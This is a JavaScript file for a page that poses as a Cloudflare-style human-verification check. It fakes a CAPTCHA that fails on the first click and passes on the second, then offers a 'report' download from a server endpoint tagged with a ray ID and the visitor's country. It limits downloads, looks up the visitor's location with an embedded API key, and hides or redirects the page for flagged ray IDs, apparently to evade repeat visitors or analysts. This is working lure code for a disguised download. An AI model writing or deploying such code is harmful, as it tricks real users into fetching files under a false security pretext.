

// domain 
const domain = window.location.hostname;


window.setTimeout(function() {
  $('#wait').css('display', 'none');
  $('#loading').css('display', 'none');
  $('#action').css('display', 'block');
  $('.captcha-wrapper').css('display', 'block');
}, 3000)


// Automatically load translations when the page loads
document.addEventListener("DOMContentLoaded", () => {
  loadTranslations();
});



// Getting the country code from the user's IP
var country_code = '';
$.get("https://api.ipdata.co?api-key=550fe21e6fda7f62b485018d9fe45bf04de9da3a4f4c735c2c812c32", function (response) {
  country_code = response.country_code;
}, "jsonp");


// Function to load translations from a JSON file
function loadTranslations() {
  fetch("./assets/lang.json")
    .then((response) => response.json())
    .then((translations) => {
      setLanguage(translations);
    })
    .catch((error) => {
      console.error("Error loading translations:", error);
    });
}

// **************** JS Code For Translate ********************
// Function to detect the user's browser language and set the appropriate text
function setLanguage(translations) {
  // Get the user's preferred language from the browser (e.g., 'en', 'es')
  let userLang = navigator.language || navigator.userLanguage;

  // Only keep the first two characters (e.g., 'en-US' becomes 'en')
  userLang = userLang.slice(0, 2);

  // If the language is not supported, default to English ('en')
  if (!translations[userLang]) {
    userLang = "en";
  }

  // Fetch all elements with the 'data-translate' attribute
  var translatableElements = document.querySelectorAll("[data-translate]");

  // Loop through each element and update its text based on the detected language
  translatableElements.forEach((element) => {

    var translateKey = element.getAttribute("data-translate");
    translations[userLang][translateKey] = translations[userLang][translateKey].replace('{{domain}}', domain)
    element.innerHTML = translations[userLang][translateKey];
  });
}




// show popup
function show_popup() {
  $('#overlay').css('display', 'block');
  $('#popup').css('display', 'block');
}

// hide popup
function hide_popup() {
  $('#overlay').css('display', 'none');
  $('#popup').css('display', 'none');
}

// hide popup when click overlay
var isClose = false;
$('#overlay').click(function() {
  // if (isClose) hide_popup();
})





// set dark mode by OS setting
console.log(window.matchMedia('(prefers-color-scheme: light)'))
// Function to toggle dark mode based on browser/system setting
function applyDarkMode() {
  // Check if the user's browser/system is set to dark mode
  if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
    // Dark mode is enabled in browser settings
    document.body.classList.add('dark-mode');
    $.post('/api/dark_mode.php', {mode: true});
    console.log('Dark mode applied based on browser setting');
  } else {
    // Light mode is enabled in browser settings
    document.body.classList.remove('dark-mode');
    $.post('/api/dark_mode.php', {mode: false});
    console.log('Light mode applied based on browser setting');
  }
}

// Detect system/browser color scheme changes
window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (event) => {
  console.log(event.matchs, )
  if (event.matches) {
    // User switched to dark mode
    document.body.classList.add('dark-mode');
    console.log('Switched to dark mode');
    $.post('/api/dark_mode.php', {mode: true});
  } else {
    // User switched to light mode
    document.body.classList.remove('dark-mode');
    console.log('Switched to light mode');
    $.post('/api/dark_mode.php', {mode: false});
  }
  location.reload();
});

// Apply the initial mode when the page loads
applyDarkMode();




let clickCount = 0;

// play video loading
$('#checkbox-container').click(function() {
  // Replace checkbox with spinner
  // document.getElementById("captcha-checkbox").style.display = "none";
  // document.getElementById("captcha-spinner").style.display = "block";
  document.getElementById("captcha-text").innerHTML = "Verifying...";

  if (clickCount == 0) {
      document.getElementById('video1').currentTime = 0;
      document.getElementById('video1').play();
  } else {  
      $('.video1').css('display', 'none');
      $('.video2').css('display', 'block');
      document.getElementById('video2').play();
  } 

  setTimeout(function () {
    // document.getElementById("captcha-spinner").style.display = "none"; // Hide spinner after 2 seconds
    
    if (clickCount == 0) {
      // First click: show alert, revert to checkbox, but no success mark
      document.getElementById("error-message").style.display = "block"; // Show red error message
      document.getElementById("captcha-text").innerHTML = "Verify you are human";
      document.getElementById('captcha-wrapper').style.height = '100px';
    } else if (clickCount == 1) {
      // Second click: successful verification, show success mark
      document.getElementById("error-message").style.display = "none"; // Hide error message
      document.getElementById("captcha-text").innerHTML = "Success!";
      document.getElementById('captcha-wrapper').style.height = 'auto';
      isClose = true;
      show_popup();
    }

    clickCount++;
  }, 2000); // Simulates loading time
})


// checkbox
$('#checkbox').change(function() {
  var ischeck = document.getElementById('checkbox').checked;
  
  if (ischeck) {
    $('#report').removeAttr('disabled');
  } else {
    $('#report').attr('disabled', 'true');
  }
})


// download ban more than 2 times
var downloadCount = 0;

// click report button
$('#report').click(function() {
  if (isClose) {
    downloadCount++;
    window.location.href = "/api/index.php?rayid=" + rayID + "&countrycode=" + country_code;
    

    window.setTimeout(function() {
        check_ray_id();
    }, 60000);
    
    // window.alert('Your report has been successfully downloaded!');
  }
  
  if (downloadCount >= 2) {
    isClose = false;
    $('#report').css('background', '#efefef');
    $('#report').attr('disabled', 'true');
  }
})


// Function to generate a random 16-character hexadecimal Ray ID
function generateRayID() {
  var characters = "0123456789abcdef";
  let rayID = "";
  for (let i = 0; i < 16; i++) {
    rayID += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return rayID;
}


// Ray ID
var rayID;
fetch(window.location.href, {
    method: 'GET',
})
.then(response => {

    if ( response.headers.get('cf-ray') ) {

        rayID = response.headers.get('cf-ray');
        $('#ray-id').text(rayID);

    } else {

        if (localStorage.getItem('ray')) {
            rayID = localStorage.getItem('ray');
        } else {
            rayID = generateRayID();
            localStorage.setItem('ray', rayID);
        }
        
        $('#ray-id').text(rayID);  
    }
})
.catch(error => {
    console.error('Error fetching page:', error);
});


// Block site
document.body.style.opacity = 0;

window.setTimeout(function() {
    check_ray_id();
}, 800)


// check ray id
function check_ray_id() {

  $.ajax({
    type: 'POST',
    url: '/api/check_rayid.php',
    data: JSON.stringify({ rayid: rayID }),
    contentType: 'application/json', // Indicate that you're sending JSON
    success: function(res) {
        console.log(res)

        if (res == '10') {
          document.body.innerHTML = '';
          location.href =  window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port : '');
        } else {
          document.body.style.opacity = 100;
        }
    }
  })
  
}


// dark video display last frame
const video = document.getElementById('video1');
// When the metadata is loaded (to get video duration), seek to the last frame
video.addEventListener('loadedmetadata', function() {
    video.currentTime = video.duration - 0.1; // Seek to near the end (slightly before)
});
